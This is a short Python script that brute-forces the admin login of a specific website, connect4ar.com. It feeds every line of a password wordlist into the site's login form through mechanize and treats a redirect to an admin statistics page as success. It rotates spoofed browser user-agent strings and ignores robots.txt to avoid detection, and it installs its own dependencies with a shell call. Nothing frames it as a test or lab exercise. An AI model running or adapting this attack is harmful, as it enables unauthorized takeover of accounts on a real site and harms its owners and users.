#pylint:disable=E1135
import mechanize,random
from colorama import Fore,init
from time import sleep
import argparse
from os import system

system("pip3 install mechanize colorama")


init()
br = mechanize.Browser()
br.set_handle_robots(False)
br._factory.is_html = True
br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
               
               
               
def login(user,password):
    
    br.open("https://connect4ar.com/login")
    br.select_form(nr=0)
    br.form['name']=user
    br.form['password']= password
    br.method ="POST"
    br.submit()

    if "admins/statistic" in br.geturl():
        return 1
    else:
        return 0
        
parse=argparse.ArgumentParser()
parse.add_argument("-u",dest="user",help="User Name")
parse.add_argument("-w",dest="wordlist",help="wordlist of passwords")

options=parse.parse_args()
user=options.user
wordlist=options.wordlist

with open(wordlist,"r") as file:
    passwords=file.readlines()
    for password in passwords:
        try:
            
            ret=login(user,password)
            if ret:
                print(Fore.GREEN+f"{passwords.index(password)+1} : login Successfully for password {password}"+Fore.WHITE)
                break
            else:
                print(Fore.RED+f"{passwords.index(password)+1} :login Unsuccssfully for Password {password} "+Fore.WHITE)
            
        except:
             print("Error")
            
